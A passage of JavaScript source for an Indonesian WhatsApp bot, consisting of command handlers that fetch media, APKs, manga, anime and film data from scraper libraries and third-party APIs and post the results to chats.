RezzHost.sendMessage(m.chat, { image: { url: result.image }, caption: `乂 *[ P I X I V ]*\n\n   ◦  *Title* : ${result.title}\n   ◦  *Id* : ${result.id}\n\n${footer}` }, { quoted: kalgans })
await sleep(1500)
}
}
break
case 'likevideo': {
if (!q) return reply(`Gunakan Format : ${command} https://l.likee.video/v/JvI12V`)
if (!isUrl(q)) throw reply('hayoo') 
if (!q.includes('like.com')/('l.likee')) return reply('Link Invalid ❎')
reply(mess.search)
let li = require('./lib/scrape/likee-downloader')
let lik = await li.likeDown(text)
let txt = `乂 *L I K E -  D O W N L O A D E R*\n\n`
txt += `*Caption*: ${lik.caption}\n\n Wait Is Sending The Data You Request\n\n${footer}`
RezzHost.sendMessage(m.chat, {
text: txt,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
title: `乂 L I K E - V I D E O`,
body: '',
thumbnailUrl: "https://telegra.ph/file/02bd7e67dd36b1969ee1e.jpg",
sourceUrl: hariini,
mediaType: 1,
renderLargerThumbnail: true
}}
})
RezzHost.sendMessage(m.chat, { video: { url: lik.data.watermark }, mimetype: 'video/mp4', caption: lik.caption }, { quoted: fcall })
}
break
case 'terabox': {
if (!isRegistered) return reply2(mess.regis)
if (!q) return reply(`Gunakan Format : ${command} https://teraboxapp.com/s/1MZ8yZ2Qo_2mp5s_1yo3O7Q`)
if (!isUrl(q)) throw reply('hayoo') 
if (!q.includes('teraboxapp.com')/('terabox')) return reply('Link Invalid ❎')
reply(mess.search)
let lik = await fetchJson(`https://api.alyachan.dev/api/terabox?url=${text}&apikey=${alya}`) 
let txt = `乂 *T E R A B O X -  D O W N L O A D E R*\n\n`
txt += `*FileName*: ${lik.data.filename}\n*Size*: ${lik.data.size}\n\n Wait Is Sending The Data You Request\n\n${footer}`
RezzHost.sendMessage(m.chat, { video: { url: lik.data.url }, mimetype: 'video/mp4', caption: txt }, { quoted: fverif })
}
break
case 'playstore':{
if (!isCreator) return reply(mess.owner)  
if (!text) return reply(`𝗘𝘅𝗮𝗺𝗽𝗹𝗲 : ${prefix+command} WhatsApp`)
reply(mess.search)
let anu = await fetchJson(`https://api.betabotz.eu.org/api/search/playstore?app=${text}&apikey=${btbApi}`)
let teks = `乂 *P L A Y S T O R E - S E A R C H*\n\n`
anu.result.map((v, i) => {
teks += `${i+1}.\n*Title* : ${v.nama}\n`
teks += `*Developer* : ${v.developer}\n`
teks += `*Rate* : ${v.rate2}\n`
teks += `*LinkDev* : ${v.linkdev}\n`
teks += `*Link* : ${v.link}\n\n───────────────\n\n`
}).join('\n\n')
RezzHost.sendMessage(m.chat, {
text: teks,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
title: `乂 P L A Y S T O R E`,
body: ``,
thumbnailUrl: anu.result[0].img,
sourceUrl: anu.result.link,
mediaType: 1,
renderLargerThumbnail: true
}}
})
}
break
case 'apktoide':{
if (!text) return reply(`𝗘𝘅𝗮𝗺𝗽𝗹𝗲 : ${prefix+command} WhatsApp`)
await loading()
let scp = require('./lib/scrape/scraper-apk')
let anu = await scp.aptoide.search(text)
let teks = `乂 ${gris}[ A P K  T O I D E - S E A R C H ]${gris}\n\n`
anu.map((v, i) => {
teks += `${i+1}.\n*_Name_* : ${v.name}\n`
teks += `*_Id_* : ${v.id}\n\n───────────────\n\n`
}).join('\n\n')
RezzHost.sendMessage(m.chat, {
text: teks,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
title: `乂 A P K - T O I D E`,
body: ``,
thumbnailUrl: "https://telegra.ph/file/d40834d03e864d7fb21e3.jpg",
sourceUrl: hariini,
mediaType: 1,
renderLargerThumbnail: true
}}
})
}
break
case 'apktoidedl': {
if (!text) return reply(`𝗘𝘅𝗮𝗺𝗽𝗹𝗲 : ${prefix+command} package`)
await loading()
let anu = require('./lib/scrape/scraper-apk')
let app = await anu.aptoide.download(text)
let txt = `乂  ${gris}[ A P K  T O I D E - D O W N L O A D ]${gris}

   ◦  *Name* : ${app.appname}
   ◦  *Developer* : ${app.developer}
  
${footer}`
RezzHost.sendMessage(m.chat, {
text: txt,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
title: `${app.appname}`,
body: '',
thumbnailUrl: app.img,
sourceUrl: hariini,
mediaType: 1,
renderLargerThumbnail: true
}}
})
RezzHost.sendMessage(m.chat, { document : { url : app.link }, fileName : `${app.appname}.apk`, mimetype: 'application/package' }, { quoted : fcall })
}
break
case 'joox': {
if (!text) throw reply(`*Perintah ini untuk mencari lagu joox berdasarkan pencarian*\n\ncontoh:\n${prefix + command} akad`)
reply(mess.search)
let jsonn = await fetchJson(`https://api.alyachan.dev/api/joox?q=${text}&apikey=${alya}`)
let teks = `乂 *J O O X - S E A R C H*\n\n`
jsonn.data.map((v, i) => {
teks += `${i+1}.\n*Title* : ${v.name}\n`
teks += `*Album* : ${v.album_name}\n`
teks += `*Artist* : ${v.artist_list.name}\n`
teks += `*Duration* : ${v.play_duration}\n`
teks += `*Id* : ${v.id}\n\n───────────────\n\n`
}).join('\n\n')
teks += `${footer}`
RezzHost.sendMessage(m.chat, {
text: teks,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
title: `乂 J O O X`,
body: '',
thumbnailUrl: "https://telegra.ph/file/d45632cc5a4923a28d465.jpg",
sourceUrl: hariini,
mediaType: 1,
renderLargerThumbnail: true
}}
})
}
break
case 'apkdl': {
if (args.length == 0) return reply(`Mana Link Nya ?`)
if (!isUrl(args[0]) && !args[0].includes('.')) throw `The link you provided is invalid`
reply(mess.search)
const baby1 = await fetchJson(`https://api.lolhuman.xyz/api/apkdownloader?apikey=${apikey}&package=${text}`)
result4 = `乂 *APK DOWNLOADER*

   ◦  *Name* : ${baby1.result.apk_name}
   ◦  *Version* : ${baby1.result.apk_version}
   ◦  *Author* : ${baby1.result.apk_author}
   ◦  *Link* : ${baby1.result.apk_link}
   
${footer}`
RezzHost.sendMessage(m.chat, {
text: result4,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
title: `G O G L E - P L A Y S T O R E`,
body: '',
thumbnailUrl: ppuser,
sourceUrl: hariini,
mediaType: 1,
renderLargerThumbnail: true
}}
})
RezzHost.sendMessage(m.chat, { document : { url : baby1.result.apk_link}, fileName : `${baby1.result.apk_name}.apk`, mimetype: 'application/document' }, { quoted : kalgans })
}
break
case 'rexdl': {
if (!args || !args[0]) return reply(`Example: ${prefix, command} https://rexdl.com/android/xplayer-video-player-all-format-apk.html/`)
if (!args[0].match(/(https:\/\/rexdl.com\/)/gi)) return reply(`masukan url rexdl`)
reply(mess.search)
let json = await rexdldownload(args[0])
let text = `乂  *R E X - D L*\n\n`
text += `	◦  *Name* : ${json.name}\n`
text += `	◦  *Size* : ${json.size}\n`
text += `	◦  *Update* : ${json.update}\n`
text += `	◦  *Version* : ${json.version}\n`
text += `	◦  *Password* : ${json.password}\n\n`
text += global.footer
RezzHost.sendMessage(m.chat, {
text: text,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
title: `乂 R E X - D O W N L O A D`,
body: '',
thumbnailUrl: ppuser,
sourceUrl: hariini,
mediaType: 1,
renderLargerThumbnail: true
}}
}).then(async () => {
json.data.map(async v => {
RezzHost.sendMessage(m.chat, { document : { url : v.url}, fileName : `${v.filename}`, mimetype: 'application/document' }, { quoted : kalgans })
await sleep(1000)
})
})
}
break
case 'sfiledl2': {
if (!text) return reply(`Mana Link Nya ?`)
if (!isUrl(args[0]) && !args[0].includes('sfile.mobi')) throw `The link you provided is invalid`
reply(mess.search)
const lk = await fetchJson(`https://api.kimzzoffc.me/api/download/sfile?url=${text}&apikey=${kimz}`)
lkn = lk.result
text2 = `乂 S F I L E - D O W N L O A D

     ◦‎  Name : ${lkn.filename}
     ◦‎  Mimetype : ${lkn.mimetype}
     ◦‎  Upload : ${lkn.upload_date}
     ◦‎  Author : ${lkn.upload_by}
     ◦‎  Downloads : ${lkn.downloads_count}
     ◦‎  Decs : ${lkn.decs}
     
     
${footer}`
RezzHost.sendMessage(m.chat, {
text: text2,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
title: `S O L I D F I L E`,
body: '',
thumbnailUrl: lkn.icon,
sourceUrl: hariini,
mediaType: 1,
renderLargerThumbnail: true
}}
})
RezzHost.sendMessage(m.chat, { document : { url : lkn.url }, fileName : lkn.filename, mimetype: lkn.mimetype }, { quoted : kalgans })
}
break
case 'sfiledl': {
if (args.length == 0) return reply(`Mana Link Nya ?`)
if (!isUrl(args[0]) && !args[0].includes('sfile.mobi')) throw `The link you provided is invalid`
reply(mess.search)
const baby1 = await dylux.sfileDl(args[0])
RezzHost.sendMessage(m.chat, { document : { url : baby1.url }, fileName : baby1.filename, mimetype: baby1.mimetype }, { quoted : kalgans })
}
break
case 'sfile': {
if (text.match(/(https:\/\/sfile.mobi\/)/gi)) {
let res = await sfileDl(args[0])
if (!res) throw 'Error :/'
reply(mess.search)
RezzHost.sendMessage(m.chat, { document: { url: res.download }, fileName: res.filename, mimetype: res.mimetype }, { quoted: m })
} else if (text) {
let [query, page] = text.split`|`
let res = await sfileSearch(query, page)
if (!res.length) throw `Query "${text}" not found :/`
res = res.map((v) => `*Title:* ${v.title}\n*Size:* ${v.size}\n*Link:* ${v.link}`).join`\n\n`
reply(res)
} else throw 'Masukan Pencarian/Linknya'
}
break
case 'capcut': {
if (!args[0]) return reply(`Masukan Url Capcut!\n\nContoh:\n${prefix + command} https://www.capcut.net/sharevideo?template_id=7239111787965205762&language=in&region=ID`)
if (!/www.capcut/i.test(args[0])) return reply('Invalid Url!')
reply(mess.search)
let cut = await fetchJson(`https://aemt.me/download/capcut?url=${text}`)
RezzHost.sendMessage(m.chat, { video: { url: cut.result.video_ori }, caption: `*[ C A P C U T - D O W N L O A D E R ]*\n\nTitle : ${cut.result.title}\nDescription : ${cut.result.description}` }, { quoted: kalgans }) 
}
break
case 'amv': {
if (!text) return reply('amv 1-2')
if(text == 1) {
reply(mess.search)
let json = await amv1()
let caption = `乂 *V I D E O  A M V*\n\n`
caption += `	◦  *Title* : ${json.title}\n\n`
caption += global.footer
RezzHost.sendMessage(m.chat, { video: { url: json.source }, caption: caption }, {quoted: kalgans})
} else if(text == 2) {
reply(mess.search)
let json = await amv2()
let caption = `乂 *V I D E O  A M V*\n\n`
caption += `	◦  *Title* : ${json.title}\n\n`
caption += global.footer
RezzHost.sendMessage(m.chat, { video: { url: json.source }, caption: caption }, {quoted: kalgans})  
}
}
break
case 'xnxxsearch2':{
if (!isCreator) return reply(mess.owner)  
if (!text) return reply(`𝗘𝘅𝗮𝗺𝗽𝗹𝗲 : ${prefix+command} 𝗷𝗮𝗽𝗮𝗻𝘀𝗲`)
reply(mess.search)
let anu = await chApi.xnxxsearch(text)
let teks = `乂 *X N X X - S E A R C H*\n\n`
anu.result.map((v, i) => {
teks += `${i+1}.\n*Title* : ${v.title}\n`
teks += `*Info* : ${v.info}\n`
teks += `*Link* : ${v.link}\n\n───────────────\n\n`
}).join('\n\n')
teks += `${footer}`
reply2(teks) 
}
break
case 'xnxxsearch':{
if (!isCreator) return reply(mess.owner)  
if (!text) return reply(`𝗘𝘅𝗮𝗺𝗽𝗹𝗲 : ${prefix+command} 𝗷𝗮𝗽𝗮𝗻𝘀𝗲`)
reply(mess.search)
let anu = await dylux.xnxxSearch(text)
let teks = `乂 *X N X X - S E A R C H*\n\n`
anu.result.map((v, i) => {
teks += `${i+1}.\n*Title* : ${v.title}\n`
teks += `*Link* : ${v.link}\n\n───────────────\n\n`
}).join('\n\n')
reply2(teks)
}
break
case 'xnxxsearch4':{
if (!isCreator) return reply(mess.owner)  
if (!text) return reply(`𝗘𝘅𝗮𝗺𝗽𝗹𝗲 : ${prefix+command} 𝗷𝗮𝗽𝗮𝗻𝘀𝗲`)
reply(mess.search)
let anu = await fetchJson(`https://api.lolhuman.xyz/api/xnxxsearch?apikey=${apikey}&query=${text}`)
let teks = `乂 *X N X X - S E A R C H*\n\n`
anu.result.map((v, i) => {
teks += `${i+1}.\n*Title* : ${v.title}\n`
teks += `*Duration* : ${v.duration}\n`
teks += `*Link* : ${v.link}\n\n───────────────\n\n`
}).join('\n\n')
await RezzHost.sendMessage(m.chat, { image: { url: anu.result[0].thumbnail }, caption: teks }, { quoted: kalgans })
}
break
case 'xnxxsearch3':{
if (!isCreator) return reply(mess.owner)  
if (!text) return reply(`𝗘𝘅𝗮𝗺𝗽𝗹𝗲 : ${prefix+command} 𝗷𝗮𝗽𝗮𝗻𝘀𝗲`)
reply(mess.search)
let xn = require('./lib/scrape/scrapXnxx.js')
let anu = await xn.xnxx.xnxxsearch(text)
let teks = `乂 *X N X X - S E A R C H*\n\n`
anu.result.map((v, i) => {
teks += `${i+1}.\n*Title* : ${v.title}\n`
teks += `*Info* : ${v.info}\n`
teks += `*Link* : ${v.link}\n\n───────────────\n\n`
}).join('\n\n')
teks += `${footer}`
reply2(teks) 
}
break
case 'xnxxdl':{
if (!isCreator) return reply(mess.owner)    
if (!text) return reply(`𝗘𝘅𝗮𝗺𝗽𝗹𝗲 : ${prefix+command} 𝘂𝗿𝗹`)
reply(mess.search)
let anu = await chApi.xnxxdl(text)
const cpt = anu.result.title
const nick = anu.result.info
const dr = anu.result.duration
RezzHost.sendMessage(m.chat, { video: { url: anu.result.files.high }, caption: `乂 X N X X - D L\n\n   ◦  Judul : ${cpt}\n   ◦  Durasi : ${dr}\n   ◦  Info : ${nick}\n\n${footer}`}, {quoted: kalgans})
}
break
case 'xnxxdl2':{
if (!isCreator) return reply(mess.owner)    
if (!text) return reply(`𝗘𝘅𝗮𝗺𝗽𝗹𝗲 : ${prefix+command} 𝘂𝗿𝗹`)
reply(mess.search)
let anu = await dylux.xnxxdl(text)
const cpt = anu.title
const nick = anu.quality
const dr = anu.duration
RezzHost.sendMessage(m.chat, { video: { url: anu.url_dl }, caption: `乂 X N X X - D L\n\n   ◦  Judul : ${cpt}\n   ◦  Durasi : ${dr}\n   ◦  Quality : ${nick}\n\n${footer}`}, {quoted: kalgans})
}
break
case 'gdrive': {
if (!args[0]) return reply(`Enter the Google Drive link`)
reply(mess.search)
const fg = require('api-dylux')
try {
let res = await fg.GDriveDl(args[0])
gdr = `乂 G O G L E - D R I V E

   ◦  *Nama:* ${res.fileName}
   ◦  *Size:* ${res.fileSize}
   ◦  *Type:* ${res.mimetype}
   
${footer}`
RezzHost.sendMessage(m.chat, {
text: gdr,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
title: `G O G L E  D R I V E - D O W N L O A D`,
body: '',
thumbnailUrl: ppuser,
sourceUrl: hariini,
mediaType: 1,
renderLargerThumbnail: true
}}
})
RezzHost.sendMessage(m.chat, { document: { url: res.downloadUrl }, fileName: res.fileName, mimetype: res.mimetype }, { quoted: kalgans })
} catch (err) {
console.log(err)
return reply('Error: Check link or try another link')
}
}
break
case 'imdb': {
if (!text) return reply(`Name a Series or movie`)
reply(mess.search)
let fids = await axios.get(`http://www.omdbapi.com/?apikey=742b2d09&t=${text}&plot=full`)
let imdbt = ``
console.log(fids.data)
imdbt += `乂 I M B D - S E A R C H\n\n`
imdbt += `   ◦  Title : ${fids.data.Title}\n`
imdbt += `   ◦  Year : ${fids.data.Year}\n`
imdbt += `   ◦  Rated : ${fids.data.Rated}\n`
imdbt += `   ◦  Released : ${fids.data.Released}\n`
imdbt += `   ◦  Runtime : ${fids.data.Runtime}\n`
imdbt += `   ◦  Genre : ${fids.data.Genre}\n`
imdbt += `   ◦  Director : ${fids.data.Director}\n`
imdbt += `   ◦  Writer : ${fids.data.Writer}\n`
imdbt += `   ◦  Actors : ${fids.data.Actors}\n`
imdbt += `   ◦  Plot : ${fids.data.Plot}\n`
imdbt += `   ◦  Language : ${fids.data.Language}\n`
imdbt += `   ◦  Country : ${fids.data.Country}\n`
imdbt += `   ◦  ️Awards : ${fids.data.Awards}\n`
imdbt += `   ◦  BoxOffice  : ${fids.data.BoxOffice}\n`
imdbt += `   ◦  ️Production : ${fids.data.Production}\n`
imdbt += `   ◦  imdbRating : ${fids.data.imdbRating}\n`
imdbt += `   ◦  imdbVotes : ${fids.data.imdbVotes}\n\n`
imdbt += `${footer}`
RezzHost.sendMessage(m.chat, {
text: imdbt,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
title: botname,
body: '',
thumbnailUrl: ppuser,
sourceUrl: hariini,
mediaType: 1,
renderLargerThumbnail: true
}}
})
}
break
case 'kiryuusearch':{
if (!isCreator) return reply(mess.owner)  
if (!text) return reply(`𝗘𝘅𝗮𝗺𝗽𝗹𝗲 : ${prefix+command} Boruto`)
reply(mess.search)
let anu = await chApi.kiryu(text)
let teks = `乂 *K I R Y U U - S E A R C H*\n\n`
anu.map((v, i) => {
teks += `${i+1}. ${v.judul}\n`
teks += `*Title* : ${v.judul}\n`
teks += `*Author* : ${v.author}\n`
teks += `*Rating* : ${v.rating}\n`
teks += `*LastChapter* : ${v.last_chapter}\n`
teks += `*Link* : ${v.link}\n\n───────────────\n\n`
}).join('\n\n')
teks += `${footer}`
RezzHost.sendMessage(m.chat, {
text: teks,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
title: `乂 K I R Y U U`,
body: '',
thumbnailUrl: anu[0].thumbnail,
sourceUrl: hariini,
mediaType: 1,
renderLargerThumbnail: true
}}
})
}
break
case 'mangasearch': {
if (!isRegistered) return reply2(mess.regis)
if (!q) return reply(`Example ${prefix+command} Naruto`)
reply(mess.search)
let v = await fetchJson(`https://api.caliph.biz.id/api/mangasearch?query=${q}&apikey=${caliph}`)
let teks = `   ◦  *Judul* : ${v.judul}\n`
teks += `   ◦  *Thumbnail* : ${v.thumbnail}\n`
teks += `   ◦  *Link* : ${v.link}\n\n───────────────`
reply(teks)
}
break
case 'mangatoons2':{
if (!isCreator) return reply(mess.owner)  
if (!text) return reply(`𝗘𝘅𝗮𝗺𝗽𝗹𝗲 : ${prefix+command} Naruto`)
reply(mess.search)
let anu = await api2.mangatoon(text)
let teks = `乂 *M A N G A T O O N - S E A R C H*\n\n`
anu.map((v, i) => {
teks += `${i+1}. ${v.comic_name}\n`
teks += `*Title* : ${v.comic_name}\n`
teks += `*Type* : ${v.comic_type}\n`
teks += `*Link* : ${v.comic_url}\n\n───────────────\n\n`
}).join('\n\n')
teks += `${footer}`
RezzHost.sendMessage(m.chat, {
text: teks,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
title: `乂 M A N G A T O O N`,
body: '',
thumbnailUrl: anu[0].comic_thumb,
sourceUrl: hariini,
mediaType: 1,
renderLargerThumbnail: true
}}
})
}
break
case 'mangatoons': {
if (!isRegistered) return reply2(mess.regis)
if (!q) return reply(`Example ${prefix+command} Naruto`)
reply(mess.search)
let anu = await fetchJson(`https://api.caliph.biz.id/api/mangatoonsearch?query=${q}&apikey=${caliph}`)
let teks = `乂 M A N G A\n\n`
anu.data.map((v, i) => {
teks += `${i+1}. ${v.title}\n`
teks += `   ◦  *Judul* : ${v.title}\n`
teks += `   ◦  *Genre* : ${v.genre}\n`
teks += `   ◦  *Link* : ${v.url}\n\n───────────────\n\n`
}).join('\n\n')
RezzHost.sendMessage(m.chat, {
                        text: teks,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: `乂 M A N G A - S E A R C H`,
                                body: '',
                                thumbnailUrl: anu.data[0].thumb,
                                sourceUrl: hariini,
                                mediaType: 1,
                                renderLargerThumbnail: true
			}}
			})
}
break
case 'kusonime2':{
if (!isCreator) return reply(mess.owner)  
if (!text) return reply(`𝗘𝘅𝗮𝗺𝗽𝗹𝗲 : ${prefix+command} one piece`)
reply(mess.search)
let anu = await fetchJson(`https://api.lolhuman.xyz/api/kusonimesearch2?apikey=${apikey}&query=${text}`)
let teks = `乂 *K U S O N I M E - S E A R C H*\n\n`
anu.result.map((v, i) => {
teks += `${i+1}. *Title* : ${v.title}\n`
teks += `*Link* : ${v.link}\n\n───────────────\n\n`
}).join('\n\n')
teks += `${footer}`
await RezzHost.sendMessage(m.chat, { image: { url: anu.result[0].thumbnail }, caption: teks }, { quoted: kalgans }) 
}
break
case 'kusonime': {
if (!isRegistered) return reply2(mess.regis)
if (!q) return reply(`Example ${prefix+command} Naruto`)
reply(mess.search)
json = await fetchJson(`https://api.lolhuman.xyz/api/kusonimesearch?apikey=${apikey}&query=${text}`)
         let p = `*K U S O N I M E*\n\n`
         p += `*Title*: ${json.result.title}\n`
         p += `*Desc*: ${json.result.desc}\n`
         p += `*Japanese*: ${json.result.japanese}\n` 
         p += `*Produser*: ${json.result.producers[0]}\n`  
         for (let x of Object.keys(json.result.link_dl)) {
	     p += `\n\n*${x}*\n`
		 p += json.result.link_dl[x]   
		 for (let y of Object.keys(json.result.link_dl[x])) {
		 p += `${y} : ${json.result.link_dl[x][y]}\n`
		 }
		 }
RezzHost.sendMessage(m.chat, {
                        text: p,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: `乂 K U S O N I M E`,
                                body: '',
                                thumbnailUrl: `${json.result.thumbnail}`,
                                sourceUrl: hariini,
                                mediaType: 1,
                                renderLargerThumbnail: true
			}}
			})
}
break
case 'highlights': {
if (!isRegistered) return reply2(mess.regis)
if (!q) return reply('Link?')
reply(mess.getdata)
let ap = await fetchJson(`https://api.yanzbotz.my.id/api/downloader/highlight?url=${text}&apiKey=${yanzApi}`)
RezzHost.sendMessage(m.chat, { video: { url: ap.result.data }, caption: mess.success }, { quoted: kalgans })
}
break
case 'stickersearch': {
if (!text) return reply(`example ${prefix + command} Doraemon`)
reply(mess.search)
anu = await stickersearch(text)
for (let rehs of anu.sticker_url) {
await sleep(1500)
await RezzHost.sendImageAsSticker(m.chat, rehs, kalgans, { packname: packname, author: author })
}
}
break
case 'telestick': {
if (!isCreator) return reply(mess.owner)
if (!isRegistered) return reply2(mess.regis)
if (!q) return reply("Link?")
reply(mess.search)
                let agg = await fetchJson(`https://api.lolhuman.xyz/api/telestick?apikey=${apikey}&url=${q}`)
for (var ki = 0; ki < agg.result.sticker.length; ki++) {
await RezzHost.sendImageAsSticker(m.chat, agg.result.sticker[ki], m, {
packname: packname,
author: author
})
}
}
break 
case 'linestick': {
if (!isCreator) return reply(mess.owner)
if (!isRegistered) return reply2(mess.regis)
if (!q) return reply("Link?")
reply(mess.search)
let agg = await fetchJson(`https://api.xfarr.com/api/download/linesticker?apikey=${xfarApi}&url=${text}`)
for (var ki = 0; ki < agg.result.sticker.length; ki++) {
await RezzHost.sendImageAsSticker(m.chat, agg.result.sticker[ki], kalgans, {
packname: packname,
author: author
})
}
}
break
case 'facebook2': case 'fbdl2': {
if (!text) return reply(`Example: ${prefix + command} https://fb.watch/nQuDz4C6Nq/?mibextid=fqt0pQ`)
await loading()
let dat = await fetchJson(`https://aemt.me/download/fbdl?url=${text}`)
var url = dat.result
RezzHost.sendMessage(m.chat, { video: { url: url.HD }, mimetype: 'video/mp4' })
RezzHost.sendMessage(m.chat, { audio: { url: url.audio }, mimetype: 'audio/mp4' }, { quoted: kalgans })
}
break
case 'facebook': case 'fbdl': {
if (args.length == 0) return reply(`Example: ${prefix + command} https://fb.watch/nQuDz4C6Nq/?mibextid=fqt0pQ`)
reply(mess.search)
axios.get(`https://api.lolhuman.xyz/api/facebook?apikey=${apikey}&url=${args[0]}`).then(({ data }) => {
var url = data.result[0]
if (url.includes('.mp4')) {
RezzHost.sendMessage(m.chat, { video: { url }, mimetype: 'video/mp4' })
} else {
RezzHost.sendMessage(m.chat, { image: { url } })
}
})
			
}
break
case 'ig': {
if (!text) return reply(`Example: ${prefix + command} https://www.instagram.com/p/CJ8XKFmJ4al/?igshid=1acpcqo44kgkn`)
await loading()
let old = new Date()
let json = await fetchJson(`https://dikaardnt.com/api/download/instagram?url=${text}`)
let urlq = json[0]
if (urlq.includes('.jpg')) {
json.forEach(async (k) => {
await RezzHost.sendMessage(m.chat, { image: { url: k }}, { quoted: fcall });
})
} else {
RezzHost.sendMessage(m.chat,{video:{url: json }, caption: mess.success },{quoted:kalgans})
}
}
break
case 'instagram': {
if (!isCreator) return reply2(mess.owner)
if (!text) throw `Example : ${prefix + command} https://www.instagram.com/p/CJ8XKFmJ4al/?igshid=1acpcqo44kgkn`
await loading ()
reply(mess.search)
let iganu = await igdl2(text)
RezzHost.sendMessage(m.chat, { video: { url: iganu[0].url }, caption: mess.success })
}
break
case 'igjpg': case 'igdljpg':{
if (!isRegistered) return reply2(mess.regis)
if (!q) return reply(`Example: ${command} https://www.instagram.com/p/CtB6JOBLb8Q/?igshid=MzRlODBiNWFlZA==`)
reply(mess.search)
await sleep(1000)
fetchJson(`https://api.lolhuman.xyz/api/instagram?apikey=${apikey}&url=${q}`)
.then(ig_res => {
RezzHost.sendMessage(from, {image:{url:ig_res.result}, caption:'Ini kak jangan lupa berterima kasih'}, {quoted: kalgans})
}).catch((err) => {
reply('Terjadi Kesalahan!!\nUrl tidak valid')
})
}
break
case 'igdl': {
if (args.length == 0) return reply(`Example: ${prefix + command} https://www.instagram.com/p/CJ8XKFmJ4al/?igshid=1acpcqo44kgkn`)
reply(mess.search)
axios.get(`https://api.lolhuman.xyz/api/instagram?apikey=${apikey}&url=${args[0]}`).then(({ data }) => {
var url = data.result[0]
if (url.includes('.mp4')) {
RezzHost.sendMessage(m.chat, { video: { url }, mimetype: 'video/mp4' })
} else {
RezzHost.sendMessage(m.chat, { image: { url } })
}
})			
}
break
case 'instagram2': {
if (!text) return reply(`sertakan link instagram`)
await loading()
let ig = await igdl3(text)
RezzHost.sendMessage(m.chat, { video: { url: ig[0].url }, caption: mess.success }, { quoted: fverif })
}
break
case 'pinterestdl':{
if (!isRegistered) return reply2(mess.regis)
if (!q) return reply(`Example :${prefix+command} https://id.pinterest.com/pin/688347124289528604/`)
reply(mess.search)
await sleep(1000)
fetchJson(`https://api.lolhuman.xyz/api/pinterestdl?apikey=${apikey}&url=${q}`)
.then(ig_res => {
RezzHost.sendMessage(from, {image:{url:ig_res.result}, caption:'Ini kak jangan lupa berterima kasih'}, {quoted: kalgans})
}).catch((err) => {
reply('Terjadi Kesalahan!!\nUrl tidak valid')
})
}
break
case 'pinvideo':{
if (!isRegistered) return reply2(mess.regis)
if (!q) return reply(`Example :${prefix+command} https://id.pinterest.com/pin/688347124289528604/`)
reply(mess.search)
await sleep(1000)
fetchJson(`https://api.lolhuman.xyz/api/pinterestdl?apikey=${apikey}&url=${q}`)
.then(ig_res => {
RezzHost.sendMessage(from, {video:{url:ig_res.result}, caption:'Ini kak jangan lupa berterima kasih'}, {quoted: kalgans})
}).catch((err) => {
reply('Terjadi Kesalahan!!\nUrl tidak valid')
})
}
break
case 'twitter':{
if (!text) return reply2('Link nya kak?\n\nContoh : .twitter https://twitter.com/FCBarcelona_es/status/1615392117026586628?s=20&t=Djtl01fwdxTX1I5g-tm72A')
reply(mess.search)
let res = await fetchJson(`https://skizo.tech/api/x?apikey=${skizo}&url=${text}`)
RezzHost.sendMessage(from, { video: { url: res.media[0].url }, caption: `${gris}[ X - D O W N L O A D E R ]${gris}\n\n_Likes :_ ${res.likes}\n_Retweets :_ ${res.retweets}\n_Name :_ ${res.authorName}` }, { quoted: fcall })
}
break
case 'twitter2':{
if (!text) return reply2('Link nya kak?\n\nContoh : .twitter https://twitter.com/FCBarcelona_es/status/1615392117026586628?s=20&t=Djtl01fwdxTX1I5g-tm72A')
let old = new Date()
let res = await fetchJson(`https://dikaardnt.com/api/download/twitter?url=${text}`)
RezzHost.sendMessage(m.chat, { video: { url: res.url }, caption: `${gris}[ X - D O W N L O A D E R ]${gris}\n\n${hiasan}*Caption* : ${res.title}\n${hiasan}*Duration* : ${res.duration}\n${hiasan}*Fetching* : ${((new Date - old) * 1)} ms\n\n` }, { quoted: m })
}
break
case 'twitdl':{
if (!text) return reply2('Link nya kak?\n\nContoh : .twitter https://twitter.com/FCBarcelona_es/status/1615392117026586628?s=20&t=Djtl01fwdxTX1I5g-tm72A')
await loading()
reply(mess.search)
let json = await chApi.twitter(text)
RezzHost.sendMessage(from, {video:{url: json.HD },caption: "𝙎𝙪𝙠𝙨𝙚𝙨 ✅"}, {quoted:kalgans})
}
break
case 'savetik': {
if (args.length == 0) return reply(`Example: ${prefix + command} link lu`)
reply(mess.search)
let dat = await fetchJson(`https://aemt.me/download/ttdl?url=${text}`)
dui = dat.result
teks = `乂 *[ S A V E T I K - D O W N L O A D ]*

   ◦  *Title* : ${dui.title}
   ◦‎  *AudioName* : ${dui.title_audio}
   
${footer}`
RezzHost.sendMessage(m.chat, {
text: teks,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
title: `S A V E T I K`,
body: '',
thumbnailUrl: dui.thumbnail,
sourceUrl: hariini,
mediaType: 1,
renderLargerThumbnail: true
}}
})
RezzHost.sendMessage(m.chat, { video: { url: dui.video[0] }, mimetype: 'video/mp4' }, { quoted: kalgans })
}
break
case 'tiktokslide':{
if (!text) return reply(`𝗘𝘅𝗮𝗺𝗽𝗹𝗲 : ${prefix+command} url tiktok`)
await loading()
let anu = await chApi.tiktokdl(text)
anu.result.map((v, i) => {
RezzHost.sendMessage(m.chat, { image: { url: v }, caption: mess.success }, { quoted: kalgans })
sleep(1500)
})
RezzHost.sendMessage(m.chat, { audio: { url: anu.audio }, mimetype: 'audio/mp4' }, { quoted: kalgans })
}
break
case 'tiktok3': {
if (!text) throw 'Masukkan Query Link!'
let tiktok = require('./lib/scrape/tiktok2')
let old = new Date()
         let json = await tiktok.getMeta(text)
         let caption = `${gris}[ T I K T O K - D O W N L O A D ]${gris}\n\n`
         caption += `	◦  *Id* : ${json.id}\n`
         caption += `	◦  *Username* : ${json.author.name}\n`
         caption += `	◦  *Signature* : ${(json.author.signature)}\n`
         caption += `	◦  *Like* : ${(json.stats.likeCount)}\n`
